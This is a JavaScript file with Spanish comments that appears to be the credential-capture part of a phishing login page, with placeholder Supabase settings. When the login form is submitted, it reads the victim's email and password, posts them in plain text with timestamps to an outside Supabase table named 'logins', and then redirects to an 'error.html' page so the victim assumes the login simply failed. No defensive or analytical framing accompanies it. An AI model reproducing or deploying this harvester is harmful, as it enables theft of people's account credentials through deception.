// ============================================
// CONFIGURACIÓN SUPABASE
// ============================================
const SUPABASE_URL = 'https://tuproyecto.supabase.co';
const SUPABASE_KEY = 'tu_anon_key';

// ============================================
// CÓDIGO PRINCIPAL
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const formulario = document.getElementById('loginForm');
    
    if (formulario) {
        formulario.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Guardar en Supabase
            fetch(`${SUPABASE_URL}/rest/v1/logins`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    fecha: new Date().toISOString(),
                    hora: new Date().toLocaleTimeString()
                })
            })
            .then(() => console.log('✅ Guardado en base de datos'))
            .catch(err => console.log('❌ Error:', err));
            
            window.location.href = 'error.html';
        });
    }
});
